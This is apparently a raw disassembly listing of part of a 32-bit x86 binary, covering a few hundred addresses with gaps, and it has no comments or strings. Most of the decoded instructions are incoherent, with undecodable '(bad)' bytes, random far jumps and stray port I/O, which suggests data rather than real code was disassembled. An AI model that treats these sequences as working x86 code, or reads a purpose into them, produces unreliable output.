  42c088:	stos   DWORD PTR es:[edi],eax
  42c089:	mov    dl,0xdd
  42c08b:	cld    
  42c08c:	int3   
  42c08d:	pop    ds
  42c08e:	rol    esp,cl
  42c090:	mov    edx,0x7f6ae8bb
  42c095:	mov    bl,0xc0
  42c097:	add    eax,DWORD PTR [ebx-0x753305d1]
  42c09d:	in     al,dx
  42c09e:	mul    BYTE PTR [eax-0x34]
  42c0a1:	push   ebx
  42c0a2:	icebp  
  42c0a3:	in     al,dx
  42c0a4:	inc    ecx
  42c0a5:	popa   
  42c0a6:	lods   al,BYTE PTR ds:[esi]
  42c0a7:	call   0x730:0x5727020b
  42c0ae:	mov    ebx,es
  42c0b0:	nop
  42c0b1:	inc    esp
  42c0b2:	sti    
  42c0b3:	repnz lea edx,[esi+0x2d]
  42c0b7:	in     eax,dx
  42c0b8:	mov    ebx,0xaf2f44c7
  42c0bd:	in     eax,dx
  42c0be:	sub    DWORD PTR [edi+0x6b89fcfe],edi
  42c0c4:	mov    eax,0x14954d83
  42c0c9:	sbb    ecx,DWORD PTR [eax+ebx*8]
  42c0cc:	scas   al,BYTE PTR es:[edi]
  42c0cd:	pop    eax
  42c0ce:	mov    ss,edi
  42c0d0:	cmc    
  42c0d1:	and    ch,cl
  42c0d3:	leave  
  42c0d4:	pop    eax
  42c0d5:	push   cs
  42c0d6:	pop    ds
  42c0d7:	retf   0xc04
  42c0da:	mov    DWORD PTR [esi],0xf8d7dee2
  42c0e0:	cs inc ecx
  42c0e2:	retf   0x5dd2
  42c0e5:	push   edi
  42c0e6:	dec    edi
  42c0e7:	cdq    
  42c0e8:	fisttp QWORD PTR [edx+esi*1]
  42c0eb:	mov    bh,0x33
  42c0ed:	fidivr WORD PTR [edx]
  42c0ef:	and    eax,0x28e85db6
  42c0f4:	jae    0x42c083
  42c0f6:	fwait
  42c0f7:	xor    BYTE PTR [ebp-0x6a],bh
  42c0fa:	iret   
  42c0fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c0fc:	rol    ch,1
  42c0fe:	ins    DWORD PTR es:[edi],dx
  42c0ff:	pop    ecx
  42c100:	iret   
  42c101:	leave  
  42c102:	sbb    DWORD PTR [ecx],esi
  42c104:	fcmovnb st,st(5)
  42c106:	or     eax,0x9ec23036
  42c10b:	clc    
  42c10c:	sbb    DWORD PTR [ebx],edi
  42c10e:	pop    ecx
  42c10f:	mov    dh,BYTE PTR [ebp-0x36]
  42c112:	loope  0x42c152
  42c114:	ins    DWORD PTR es:[edi],dx
  42c115:	jae    0x42c0b0
  42c117:	into   
  42c118:	sbb    al,0x65
  42c11a:	lods   al,BYTE PTR ds:[esi]
  42c11b:	sub    DWORD PTR [eax-0x3d61ddb1],ebx
  42c121:	loopne 0x42c0c5
  42c123:	clc    
  42c124:	xor    BYTE PTR [edi],al
  42c126:	and    BYTE PTR [esi+0x538e3d07],0x4f
  42c12d:	mov    edi,0x31f21141
  42c132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c133:	add    al,0x48
	...
  42c195:	add    BYTE PTR [ecx-0x7e],ch
  42c198:	int    0xae
  42c19a:	out    dx,eax
  42c19b:	out    dx,eax
  42c19c:	imul   eax,edi,0xffffffa4
  42c19f:	aas    
  42c1a0:	cld    
  42c1a1:	push   ss
  42c1a2:	push   ebx
  42c1a3:	dec    edx
  42c1a4:	adc    al,0x47
  42c1a6:	sti    
  42c1a7:	xlat   BYTE PTR ds:[ebx]
  42c1a8:	add    DWORD PTR [eax],eax
  42c1aa:	pop    es
  42c1ab:	add    DWORD PTR [eax],eax
  42c1ad:	add    BYTE PTR [edi+0x4bf1da96],al
  42c1b3:	and    al,0xe0
  42c1b5:	cmc    
  42c1b6:	scas   eax,DWORD PTR es:[edi]
  42c1b7:	jecxz  0x42c222
  42c1b9:	stc    
  42c1ba:	retf   0x72ae
  42c1bd:	xchg   edi,eax
  42c1be:	xchg   DWORD PTR [edx],ebx
  42c1c0:	out    0x9d,eax
  42c1c2:	or     al,0x69
  42c1c4:	cmp    eax,esp
  42c1c6:	add    al,0xa
  42c1c8:	stos   DWORD PTR es:[edi],eax
  42c1c9:	mov    edi,0xd2a0371f
  42c1ce:	ja     0x42c1dc
  42c1d0:	dec    edx
  42c1d1:	movhps xmm2,QWORD PTR [ebx+0x3e13fee3]
  42c1d8:	in     eax,0xf4
  42c1da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c1db:	aad    0x1
  42c1dd:	dec    ebx
  42c1de:	mov    ds:0x480c9e2,al
  42c1e3:	add    edi,eax
  42c1e5:	popf   
  42c1e6:	pop    ss
  42c1e7:	ins    DWORD PTR es:[edi],dx
  42c1e8:	(bad)  
  42c1ea:	pop    ss
  42c1eb:	mov    al,0xb8
  42c1ed:	call   0x6c21:0xde3fe61c
  42c1f4:	xchg   BYTE PTR [esi+0x58],dl
  42c1f7:	dec    edx
  42c1f8:	add    eax,0x470f75b1
  42c1fd:	xor    BYTE PTR [ebx-0x56],cl
  42c200:	mov    bl,0xfa
  42c202:	push   0x21
  42c204:	int    0x82
  42c206:	daa    
  42c207:	or     bl,bl
  42c209:	jbe    0x42c195
  42c20b:	add    bl,BYTE PTR [edx-0x31]
  42c20e:	inc    edx
  42c20f:	ret    
  42c210:	retf   0x40eb
  42c213:	outs   dx,BYTE PTR ds:[esi]
  42c214:	jle    0x42c26e
  42c216:	fiadd  WORD PTR [ebp-0x64cd71a2]
  42c21c:	into   
  42c21d:	retf   
  42c21e:	or     ah,dh
  42c220:	fisttp DWORD PTR [ecx]
  42c222:	add    BYTE PTR [ebp+0xd3f154f],dh
  42c228:	rol    BYTE PTR [edx-0xa],1
  42c22b:	push   edx
  42c22c:	mov    ds:0x4c069b0d,eax
  42c231:	sbb    edx,ebp
  42c233:	or     DWORD PTR [ebp-0x80],edi
  42c236:	inc    esi
  42c237:	cmp    edx,esi
  42c239:	push   ss
  42c23a:	aaa    
  42c23b:	sub    eax,0x37060411
  42c240:	inc    edx
  42c241:	fucom  st(7)
  42c243:	aaa    
  42c244:	rcr    ebp,cl
  42c246:	bound  edx,QWORD PTR [edx+0x35d88aa9]
  42c24c:	inc    edi
  42c24d:	add    al,0x29
  42c24f:	fnstcw WORD PTR es:[edx+0x5c]
  42c253:	out    dx,al
  42c254:	xchg   edx,eax
  42c255:	add    eax,0x1244a82f
  42c25a:	mov    ch,BYTE PTR [edx+0x63]
  42c25d:	aas    
  42c25e:	(bad)  
  42c25f:	leave  
  42c260:	mov    eax,ds:0x53d8c5f6
  42c265:	jmp    0x42c2c8
  42c267:	ins    DWORD PTR es:[edi],dx
  42c268:	mov    WORD PTR [ebx],?
  42c26a:	xchg   ebp,eax
  42c26b:	mov    edi,0x2465a98
  42c270:	add    eax,0xf3e3286e
  42c275:	xor    eax,0x9940d6f2
  42c27a:	cdq    
  42c27b:	mov    ?,WORD PTR [edi-0x69]
  42c27e:	xor    eax,0x65d2ed3f
  42c283:	mov    ebp,0xfc5dfd41
  42c288:	push   ecx
  42c289:	aam    0xf8
  42c28b:	add    esi,DWORD PTR [ebx+esi*1]
  42c28e:	xchg   ebx,eax
  42c28f:	call   0x374c7771
  42c294:	xor    esi,DWORD PTR [ecx+0x35]
  42c297:	addr16 je 0x42c257
  42c29a:	inc    eax
  42c29b:	jmp    0x42c294
  42c29d:	mov    ds:0x89badafb,eax
  42c2a2:	outs   dx,DWORD PTR ds:[esi]
  42c2a3:	(bad)  
  42c2a5:	cmpxchg DWORD PTR [esi+0x3b],edi
  42c2a9:	jge    0x42c22b
  42c2ab:	data16 setge BYTE PTR [ecx-0x68]
  42c2b0:	jmp    0x0:0x9d5233df
	...
  42c313:	add    BYTE PTR [eax],al
  42c315:	add    dh,ah
  42c317:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c31b:	push   esi
  42c31d:	(bad)  
  42c31e:	adc    esi,DWORD PTR [ebx]
  42c320:	xchg   ebp,eax
  42c321:	sbb    esp,esp
  42c323:	sub    BYTE PTR ds:0x1d902b0,dh
  42c329:	add    BYTE PTR [edi],al
  42c32b:	add    DWORD PTR [eax],eax
  42c32d:	add    BYTE PTR [ebx+0xf57005c],dl
  42c333:	hlt    
  42c334:	jbe    0x42c384
  42c336:	jne    0x42c3a7
  42c338:	mov    es,WORD PTR [ebx]
  42c33a:	pop    edi
  42c33b:	fs jnp 0x42c397
  42c33e:	add    al,0xf4
  42c340:	mov    dh,0x94
  42c342:	dec    ebp
  42c343:	lea    eax,[ebx]
  42c345:	add    DWORD PTR [ebx+0x7a6bbd91],ebp
  42c34b:	mov    esp,0x6cae5612
  42c350:	push   esi
  42c351:	xchg   BYTE PTR [ecx-0x5a],al
  42c354:	sub    BYTE PTR [eax+0x39],ah
  42c357:	dec    esp
  42c358:	cmc    
  42c359:	mov    eax,ds:0x8a3975f5
  42c35e:	dec    ebp
  42c35f:	push   0x4d
  42c361:	stos   BYTE PTR es:[edi],al
  42c362:	dec    ebp
  42c363:	xchg   ebx,eax
  42c364:	ins    DWORD PTR es:[edi],dx
  42c365:	sbb    ebp,ebx
  42c367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c368:	dec    eax
  42c369:	test   dl,cl
  42c36b:	xchg   ecx,eax
  42c36c:	scas   eax,DWORD PTR es:[edi]
  42c36d:	xor    BYTE PTR [edx-0x28],cl
  42c370:	mov    al,ds:0x7cce90c4
  42c375:	fistp  DWORD PTR ds:0xd85b46ef
  42c37b:	(bad)  
  42c37d:	clc    
  42c37e:	and    DWORD PTR [edx],esp
  42c380:	(bad)  
  42c382:	loope  0x42c3f2
  42c384:	push   cs
  42c385:	xor    eax,0x7bca3e3
  42c38a:	fs pop ebx
  42c38c:	adc    eax,0x8c4bfbd1
  42c391:	xor    eax,0x251d6ce2
  42c396:	arpl   WORD PTR [ecx],bx
  42c398:	xlat   BYTE PTR ds:[ebx]
  42c399:	(bad)  
  42c39b:	fcmovb st,st(0)
  42c39d:	hlt    
  42c39e:	int    0x3
  42c3a0:	out    dx,al
  42c3a1:	das    
  42c3a2:	int    0x70
  42c3a4:	aad    0xb2
  42c3a6:	xlat   BYTE PTR ds:[ebx]
  42c3a7:	push   esp
  42c3a8:	(bad)  fs:[eax]
  42c3ab:	rcr    DWORD PTR [ebp-0x2b575414],1
  42c3b1:	inc    ebx
  42c3b2:	and    BYTE PTR [ebx],ah
  42c3b4:	dec    ebx
  42c3b5:	sar    dh,1
  42c3b7:	jns    0x42c3ef
  42c3b9:	test   DWORD PTR [ebx],0x2a4566e6
  42c3bf:	cs xor eax,0x76f8d680
  42c3c5:	test   ebx,edx
  42c3c7:	mov    ds:0x6dd8e1c6,al
  42c3cc:	xchg   esi,eax
  42c3cd:	sahf   
  42c3ce:	mov    edi,0x955c3864
  42c3d3:	sub    ebp,esi
  42c3d5:	imul   eax,DWORD PTR [ebx],0xffffffd4
  42c3d8:	mov    esi,0xbe5318b3
  42c3dd:	or     ch,bh
  42c3df:	mov    ecx,0x5e40a012
  42c3e4:	sbb    al,0x83
  42c3e6:	(bad)  
  42c3e9:	inc    edx
  42c3ea:	xchg   ebx,eax
  42c3eb:	cli    
  42c3ec:	imul   esp,DWORD PTR [edi-0x3e],0x69
  42c3f0:	aam    0x1b
  42c3f2:	inc    ebx
  42c3f3:	mov    al,0x1c
  42c3f5:	push   es
  42c3f6:	pop    ebx
  42c3f7:	pop    esp
  42c3f8:	out    dx,eax
  42c3f9:	xchg   ecx,eax
  42c3fa:	push   ss
  42c3fb:	arpl   WORD PTR [ebx+0x16],cx
  42c3fe:	and    BYTE PTR [edx+0x3f],ah
  42c401:	enter  0xcf88,0xd2
  42c405:	push   es
  42c406:	xor    DWORD PTR [edi-0x1d],ecx
  42c409:	or     ebx,ebx
  42c40b:	add    ebp,ebp
  42c40d:	mov    esp,0x42469122
  42c412:	jmp    0x42c43d
  42c414:	fst    DWORD PTR [edi-0x78b9321a]
  42c41a:	out    0xde,eax
  42c41c:	call   0x5a15:0x942be85e
  42c423:	cmp    al,cl
  42c425:	add    esp,DWORD PTR [edi+0x7b]
  42c428:	xchg   DWORD PTR [edi-0x51],ebp
  42c42b:	add    al,0x1
  42c42d:	pusha  
  42c42e:	inc    esp
  42c42f:	add    ebp,DWORD PTR [ecx-0x18]
  42c432:	ror    ch,0x7e
	...
  42c495:	add    ah,ch
  42c497:	sbb    ebp,edx
  42c499:	sahf   
  42c49a:	cmc    
  42c49b:	fsubp  st(7),st
  42c49d:	jnp    0x42c473
  42c49f:	push   esi
  42c4a1:	xor    BYTE PTR [edi+0x90a36cf],ch
  42c4a7:	fiadd  DWORD PTR [ecx]
  42c4a9:	add    BYTE PTR [edi],al
  42c4ab:	add    DWORD PTR [eax],eax
  42c4ad:	add    dl,bh
  42c4af:	call   0x655afdff
  42c4b4:	inc    edi
  42c4b5:	cmp    eax,0xc8e8398
  42c4ba:	jae    0x42c4fe
  42c4bc:	repz adc al,0x35
  42c4bf:	(bad)  
  42c4c1:	jae    0x42c4c1
  42c4c3:	ins    DWORD PTR es:[edi],dx
  42c4c4:	rcr    BYTE PTR [esp+ebx*4],0x7c
  42c4c8:	ja     0x42c4de
  42c4ca:	les    ecx,FWORD PTR [edx-0x14]
  42c4cd:	ret    0x2d32
  42c4d0:	pop    es
  42c4d1:	dec    eax
  42c4d2:	scas   al,BYTE PTR es:[edi]
  42c4d3:	into   
  42c4d4:	retf   0x44c3
  42c4d7:	call   FWORD PTR [ecx+0x45ca496e]
  42c4dd:	mov    ch,0x82
  42c4df:	int3   
  42c4e0:	scas   al,BYTE PTR es:[edi]
  42c4e1:	push   ss
  42c4e2:	cmp    dh,BYTE PTR [ebp+0x0]
  42c4e5:	push   es
  42c4e6:	sub    DWORD PTR [edx+0x51d3f5b0],eax
  42c4ec:	mov    esp,0xee315da6
  42c4f1:	sub    ah,bl
  42c4f3:	xchg   DWORD PTR [ebx-0x73],edi
  42c4f6:	cmc    
  42c4f7:	repz es mov ebp,0x224a3aa2
  42c4fe:	jns    0x42c4b7
  42c500:	in     eax,dx
  42c501:	xor    al,ah
  42c503:	and    edi,esi
  42c505:	mov    dh,BYTE PTR [eax+0x7d278dec]
  42c50b:	daa    
  42c50c:	in     eax,0x76
  42c50e:	jmp    0x4889:0x48d636a
  42c515:	(bad)  [ebp+0x53]
  42c518:	jb     0x42c53e
  42c51a:	nop
  42c51b:	lods   eax,DWORD PTR ds:[esi]
  42c51c:	push   esi
  42c51d:	sbb    DWORD PTR [edx+0x7a],0x179f5b7f
  42c524:	ja     0x42c5a2
  42c526:	jmp    0x1550c41d
  42c52b:	mov    BYTE PTR [edx],bl
  42c52d:	inc    eax
  42c52e:	ds mov al,0xb5
  42c531:	out    0x9a,al
  42c533:	add    ah,BYTE PTR [ecx-0x398d2789]
  42c539:	pusha  
  42c53a:	cmp    al,0x86
  42c53c:	pop    esi
  42c53d:	push   es
  42c53e:	fcomp  DWORD PTR [eax+0x79]
  42c541:	mov    ds,WORD PTR [eax]
  42c543:	inc    esp
  42c544:	ret    0xf388
  42c547:	jae    0x42c548
  42c549:	push   eax
  42c54a:	xchg   esp,eax
  42c54b:	or     DWORD PTR [edx],edi
  42c54d:	(bad)  
  42c54e:	sub    eax,0x642ef966
  42c553:	repnz xor DWORD PTR [ebx+0x4834917e],ebx
  42c55a:	outs   dx,BYTE PTR ds:[esi]
  42c55b:	push   eax
  42c55c:	dec    eax
  42c55d:	ins    DWORD PTR es:[edi],dx
  42c55e:	pop    ebp
  42c55f:	rcr    cl,cl
  42c561:	sbb    al,0xbe
  42c563:	cmp    DWORD PTR [eax+edx*8-0xd2bb6f6],0xffffffae
  42c56b:	rol    ah,cl
  42c56d:	mov    ebx,0x4bc4a316
  42c572:	stos   DWORD PTR es:[edi],eax
  42c573:	(bad)  
  42c574:	jb     0x42c5c6
  42c576:	push   edx
  42c577:	mov    bl,0xe3
  42c579:	cmp    BYTE PTR [ecx*8+0x28132960],ch
  42c580:	hlt    
  42c581:	sub    eax,0xfbda7da0
  42c586:	mov    cl,ah
  42c588:	out    dx,al
  42c589:	xchg   edx,eax
  42c58a:	adc    esi,DWORD PTR [edi]
  42c58c:	mov    bh,BYTE PTR [ebx-0x2df954b2]
  42c592:	add    eax,0x26112236
  42c597:	iret   
  42c598:	lahf   
  42c599:	jnp    0x42c600
  42c59b:	push   ds
  42c59c:	scas   eax,DWORD PTR es:[edi]
  42c59d:	pop    ds
  42c59e:	mov    al,0xe
  42c5a0:	in     al,0x3b
  42c5a2:	inc    ebp
  42c5a3:	fisubr DWORD PTR [edx]
  42c5a5:	aad    0x1a
  42c5a7:	movaps xmm1,XMMWORD PTR [edi+0x1225a6e]
  42c5ae:	emms   
  42c5b0:	xor    edi,DWORD PTR [ebp-0x18]
  42c5b3:	mov    al,0xd1
	...
  42c615:	add    BYTE PTR [ebp+0x48],bl
  42c618:	jle    0x42c5a8
  42c61a:	jg     0x42c5da
  42c61c:	std    
  42c61d:	fisttp DWORD PTR [edi-0x31]
  42c620:	inc    eax
  42c621:	push   edi
  42c622:	mov    ecx,0x1042e41f
  42c627:	fild   DWORD PTR [ecx]
  42c629:	add    BYTE PTR [edi],al
  42c62b:	add    DWORD PTR [eax],eax
  42c62d:	add    bl,dh
  42c62f:	sub    edi,ecx
  42c631:	fldenv ds:0xa6e2c7ea
  42c637:	mov    esp,0x24ee1860
  42c63c:	sub    bl,BYTE PTR [edi+0x1d34c666]
  42c642:	popf   
  42c643:	lock mov ecx,eax
  42c646:	cmp    edx,DWORD PTR [ebx-0x21463fa7]
  42c64c:	mov    dh,0xeb
  42c64e:	add    bl,ah
  42c650:	push   ss
  42c651:	pop    ebp
  42c652:	(bad)  
  42c653:	out    0x91,al
  42c655:	push   ecx
  42c656:	mov    ch,0x3c
  42c658:	(bad)  
  42c659:	call   DWORD PTR [edx+esi*8-0xd]
  42c65d:	dec    edx
  42c65e:	idiv   BYTE PTR [esi-0x4c871cf8]
  42c664:	in     eax,0xed
  42c666:	mov    eax,esp
  42c668:	xchg   DWORD PTR [edi],ebx
  42c66a:	or     bh,BYTE PTR [ebp+ebp*2-0x549c34e]
  42c671:	inc    ecx
  42c672:	lock and BYTE PTR [edi],ah
  42c675:	(bad)  
  42c676:	xchg   edi,eax
  42c677:	arpl   si,dx
  42c679:	xchg   esi,eax
  42c67a:	aam    0x6c
  42c67c:	shl    BYTE PTR [edi-0x71f82624],cl
  42c682:	mov    al,0xf6
  42c684:	popa   
  42c685:	ss stos BYTE PTR es:[edi],al
  42c687:	retf   0x8e20
  42c68a:	shl    DWORD PTR [esi-0x4052d48d],1
  42c690:	punpckhbw mm4,QWORD PTR [ecx+0x72ec5055]
  42c697:	aaa    
  42c698:	jno    0x42c62c
  42c69a:	add    esi,DWORD PTR [ecx+0x1ae73c3a]
  42c6a0:	mov    ebp,0x17b71b85
  42c6a5:	imul   edx,edx,0x4d
  42c6a8:	lods   eax,DWORD PTR ds:[esi]
  42c6a9:	cmp    bh,BYTE PTR [eax]
  42c6ab:	call   0x4e4b:0x7a1a96d6
  42c6b2:	hlt    
  42c6b3:	mov    ds:0x1e4efc48,eax
  42c6b8:	out    0xea,eax
  42c6ba:	test   DWORD PTR [eax+0x5e],0xa578d23f
  42c6c1:	fdivp  st(3),st
  42c6c3:	fiadd  DWORD PTR [edx]
  42c6c5:	std    
  42c6c6:	imul   ebx,esp,0xffffffcb
  42c6c9:	fdiv   st(7),st
  42c6cb:	mov    cl,BYTE PTR [ebx-0x50fcf75f]
  42c6d1:	sub    BYTE PTR [edx+0x6c],al
  42c6d4:	sbb    DWORD PTR [edi-0x6bcb9c2e],0x772f757d
  42c6de:	pop    ecx
  42c6df:	aaa    
  42c6e0:	cmp    edi,DWORD PTR [ebx+0x50eca935]
  42c6e6:	outs   dx,BYTE PTR ds:[esi]
  42c6e7:	and    ebp,DWORD PTR [edi]
  42c6e9:	xlat   BYTE PTR ds:[ebx]
  42c6ea:	adc    bh,bl
  42c6ec:	cmp    al,BYTE PTR [ebx+0x50ccd876]
  42c6f2:	scas   al,BYTE PTR es:[edi]
  42c6f3:	(bad)  
  42c6f4:	popf   
  42c6f5:	scas   eax,DWORD PTR es:[edi]
  42c6f6:	ss clc 
  42c6f8:	sub    al,0x87
  42c6fa:	sbb    DWORD PTR [ecx-0x789720a5],0xffffffe0
  42c701:	jecxz  0x42c77b
  42c703:	adc    esp,DWORD PTR [edx-0x64]
  42c706:	arpl   WORD PTR [eax],di
  42c708:	jmp    0xba9bf676
  42c70d:	lods   al,BYTE PTR ds:[esi]
  42c70e:	scas   al,BYTE PTR es:[edi]
  42c70f:	rcr    ch,0x34
  42c712:	cmp    esp,DWORD PTR ss:[ebx+0x66c64c35]
  42c719:	dec    edx
  42c71a:	pop    ds
  42c71b:	sbb    esi,esi
  42c71d:	lahf   
  42c71e:	sub    eax,0x25255f2e
  42c723:	jbe    0x42c723
  42c725:	and    DWORD PTR [ebx],0xeafa3780
  42c72b:	ja     0x42c739
  42c72d:	or     ebp,DWORD PTR [ebx-0x24]
  42c730:	adc    edx,DWORD PTR [edi]
  42c732:	xlat   BYTE PTR ds:[ebx]
  42c733:	cmc    
  42c734:	imul   eax,DWORD PTR [eax],0x0
	...
  42c796:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c79c:	jmp    FWORD PTR [ebp+0x3f90a016]
  42c7a2:	daa    
  42c7a3:	jbe    0x42c774
  42c7a5:	fcom   DWORD PTR [edi]
  42c7a7:	fadd   QWORD PTR [ecx]
  42c7a9:	add    BYTE PTR [edi],al
  42c7ab:	add    DWORD PTR [eax],eax
  42c7ad:	add    BYTE PTR [esi+edi*4],al
  42c7b0:	outs   dx,BYTE PTR ds:[esi]
  42c7b1:	(bad)  
  42c7b2:	test   BYTE PTR [edi-0x58c38f12],0xa0
  42c7b9:	out    0x76,al
  42c7bb:	ins    BYTE PTR es:[edi],dx
  42c7bc:	xlat   BYTE PTR ds:[ebx]
  42c7bd:	mov    cl,0x1e
  42c7bf:	adc    ch,BYTE PTR [ebx]
  42c7c1:	or     esi,eax
  42c7c3:	cs cmps DWORD PTR cs:[esi],DWORD PTR es:[edi]
  42c7c6:	dec    ecx
  42c7c7:	xlat   BYTE PTR ds:[ebx]
  42c7c8:	(bad)  
  42c7c9:	aam    0xf1
  42c7cb:	xor    eax,0x89abb547
  42c7d0:	aas    
  42c7d1:	div    dl
  42c7d3:	adc    BYTE PTR ds:0xafaa0d83,bl
  42c7d9:	mov    ebx,0xd65a5690
  42c7de:	jb     0x42c7eb
  42c7e0:	out    dx,al
  42c7e1:	ret    0x725c
  42c7e4:	out    0x9c,al
  42c7e6:	push   ecx
  42c7e7:	mov    esi,0xf46b8db0
  42c7ec:	pop    edx
  42c7ed:	pop    ebx
  42c7ee:	int3   
  42c7ef:	(bad)  
  42c7f0:	std    
  42c7f1:	enter  0x848f,0x40
  42c7f5:	(bad)  
  42c7f6:	fs sbb ch,0xcc
  42c7fa:	xchg   esp,eax
  42c7fb:	or     eax,0xf4a36d8d
  42c800:	hlt    
  42c801:	fadd   QWORD PTR [esi]
  42c803:	test   DWORD PTR [eax-0x1e0ef5a1],ebx
  42c809:	push   es
  42c80a:	push   ebp
  42c80b:	sahf   
  42c80c:	aas    
  42c80d:	inc    edi
  42c80e:	pop    ss
  42c80f:	ins    DWORD PTR es:[edi],dx
  42c810:	or     DWORD PTR [ebp-0x250a9ec8],ebp
  42c816:	mov    ah,0xc6
  42c818:	bound  edi,QWORD PTR [eax]
  42c81a:	inc    ecx
  42c81b:	jecxz  0x42c892
  42c81d:	sar    al,cl
  42c81f:	sub    esi,DWORD PTR [edi]
  42c821:	xchg   DWORD PTR [ecx+0x53537f32],eax
  42c827:	pop    ebx
  42c828:	rcl    DWORD PTR [esi+ecx*4-0x4c],1
  42c82c:	data16 adc al,0xc0
  42c82f:	stos   DWORD PTR es:[edi],eax
  42c830:	int    0x9e
  42c832:	mov    bh,0x9b
  42c834:	mov    DWORD PTR [eax+0x6d],0xa24442d7
  42c83b:	dec    esi
  42c83c:	inc    edx
  42c83d:	and    al,0xc5
  42c83f:	add    DWORD PTR [ecx+0x62],0xf2704359
  42c846:	mov    esi,0x220f895a
  42c84b:	not    BYTE PTR [edx+0x41bf779a]
  42c851:	cmp    eax,0x8a179ecb
  42c856:	inc    ecx
  42c857:	loopne 0x42c878
  42c859:	arpl   WORD PTR [edx],bx
  42c85b:	lock out 0x67,eax
  42c85e:	in     eax,0x43
  42c860:	daa    
  42c861:	fmul   st(2),st
  42c863:	mov    dh,0x74
  42c865:	xchg   ebp,eax
  42c866:	aam    0x68
  42c868:	enter  0x152e,0x5b
  42c86c:	pop    DWORD PTR [ecx]
  42c86e:	or     bh,dh
  42c870:	cmp    BYTE PTR ds:0x34fbcde3,bh
  42c876:	ins    DWORD PTR es:[edi],dx
  42c877:	cmovge esi,DWORD PTR ds:0x8ffa453a
  42c87e:	pop    ebx
  42c87f:	popf   
  42c880:	imul   esi,DWORD PTR [eax+0xed6a3b4],0x5e195a08
  42c88a:	dec    edi
  42c88b:	inc    ecx
  42c88c:	mov    ebx,0x4ff1a76f
  42c891:	into   
  42c892:	test   DWORD PTR [edx+0x61f9ae6e],eax
  42c898:	push   es
  42c899:	(bad)  
  42c89a:	cmc    
  42c89b:	add    dh,al
  42c89d:	sub    bl,BYTE PTR [esi-0x1963209a]
  42c8a3:	mov    al,ds:0x4fb8d1d0
  42c8a8:	xchg   DWORD PTR [edx+0x574021bc],eax
  42c8ae:	dec    ebp
  42c8af:	push   es
  42c8b0:	(bad)  
  42c8b1:	pop    ss
  42c8b2:	sti    
  42c8b3:	sahf   
  42c8b4:	ja     0x42c8b6
	...
  42c916:	adc    BYTE PTR [ebx],bl
  42c918:	leave  
  42c919:	jmp    0xfb73c4e9
  42c91e:	addr16 mov ds:0xa954,al
  42c922:	mov    BYTE PTR [ebx],al
  42c924:	outs   dx,BYTE PTR ds:[esi]
  42c925:	nop    ebp
  42c928:	add    DWORD PTR [eax],eax
  42c92a:	pop    es
  42c92b:	add    DWORD PTR [eax],eax
  42c92d:	add    BYTE PTR ds:0xd5d592f8,bl
  42c933:	push   ss
  42c934:	imul   edx,eax,0x648e081c
  42c93a:	fimul  DWORD PTR [ecx-0x10b81a86]
  42c940:	add    DWORD PTR [ecx+eiz*8],0x1a5eae22
  42c947:	add    esi,DWORD PTR [esi]
  42c949:	nop
  42c94a:	xlat   BYTE PTR ds:[ebx]
  42c94b:	dec    edi
  42c94c:	push   ebx
  42c94d:	call   FWORD PTR [eax]
  42c94f:	adc    ah,BYTE PTR [eax-0x50fb7b87]
  42c955:	or     al,0xf9
  42c957:	mul    DWORD PTR [ebp-0x3e]
  42c95a:	xor    eax,DWORD PTR [ecx-0x5c3a417f]
  42c960:	add    ecx,esp
  42c962:	fwait
  42c963:	adc    al,0xd9
  42c965:	or     dh,dl
  42c967:	shl    BYTE PTR [ecx+edi*4+0x52],0xbc
  42c96c:	ficom  DWORD PTR ds:0x56345814
  42c972:	xor    BYTE PTR [ebx+0x30],bl
  42c975:	loopne 0x42c978
  42c977:	cli    
  42c978:	adc    edi,DWORD PTR [ebx+0x42]
  42c97b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c97c:	fdiv   DWORD PTR [ebp+0x227e1b58]
  42c982:	jnp    0x42c984
  42c984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c985:	or     ch,dh
  42c987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c988:	lods   al,BYTE PTR ds:[esi]
  42c989:	lods   eax,DWORD PTR ds:[esi]
  42c98a:	dec    ebx
  42c98b:	fmul   QWORD PTR [edi+ebx*2-0x5b]
  42c98f:	sar    DWORD PTR [esi+0x1f8a51ab],cl
  42c995:	dec    esi
  42c996:	bound  edx,QWORD PTR [ebp-0x2c]
  42c999:	xor    eax,0x8fe4b67c
  42c99e:	cwde   
  42c99f:	push   es
  42c9a0:	xchg   esi,eax
  42c9a1:	dec    edx
  42c9a2:	ins    BYTE PTR es:[edi],dx
  42c9a3:	mov    al,0x51
  42c9a5:	cmp    bl,BYTE PTR [esp+eax*2+0x771748b1]
  42c9ac:	loope  0x42c9d1
  42c9ae:	pop    edx
  42c9af:	jle    0x42c97c
  42c9b1:	ins    BYTE PTR es:[edi],dx
  42c9b2:	test   al,0xd4
  42c9b4:	daa    
  42c9b5:	cli    
  42c9b6:	mov    dh,0x3c
  42c9b8:	pop    ebx
  42c9b9:	mov    ecx,0x2e76f739
  42c9be:	pop    ss
  42c9bf:	out    0xa1,eax
  42c9c1:	xor    al,0x6a
  42c9c3:	fisub  DWORD PTR [ecx+0x7eba2c64]
  42c9c9:	pop    edi
  42c9ca:	fcomp  DWORD PTR [ecx+0x2d8f75fb]
  42c9d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9d1:	pushf  
  42c9d2:	sbb    eax,0xcf134659
  42c9d7:	in     al,0x8e
  42c9d9:	imul   ecx,edi,0x5d246095
  42c9df:	lods   al,BYTE PTR ds:[esi]
  42c9e0:	shr    ah,0x55
  42c9e3:	adc    al,BYTE PTR [ebx-0x7f]
  42c9e6:	jecxz  0x42c992
  42c9e8:	and    DWORD PTR ds:0xd11647d7,0x6d
  42c9ef:	imul   eax,DWORD PTR [ebx],0x7e221332
  42c9f5:	test   BYTE PTR ds:0x3624c2b4,al
  42c9fb:	cmp    ah,BYTE PTR [bp+di]
  42c9fe:	mov    gs,WORD PTR [edi]
  42ca00:	imul   edx,esi,0xffffffa0
  42ca03:	jp     0x42ca3e
  42ca05:	or     DWORD PTR [ebp-0x49],ebx
  42ca08:	in     eax,dx
  42ca09:	push   eax
  42ca0a:	pop    ecx
